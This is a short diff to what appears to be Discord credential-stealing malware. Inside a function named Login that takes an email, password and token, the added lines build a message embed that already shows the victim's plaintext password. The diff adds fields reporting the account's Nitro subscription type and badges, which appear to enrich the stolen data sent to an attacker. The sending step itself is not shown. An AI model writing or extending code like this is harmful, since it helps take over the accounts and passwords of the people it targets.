@@ -174,6 +174,21 @@ function Login(email, password, token) {
                         {
                             "name": " password",
                             "value": ` - ${password}`,
+                            "inline": true		    
+                        },
+                        {
+                            "name": "᲼᲼᲼᲼",
+                            "value": `᲼᲼᲼᲼`,
+                            "inline": false
+                        },
+                        {
+                            "name": " nitro type",
+                            "value": ` - ${GetNitro(json.premium_type)}`,
+                            "inline": true
+                        },
+                        {
+                            "name": " badges",
+                            "value": ` - ${GetBadges(json.flags)}`,
                             "inline": true
                         },
                         {
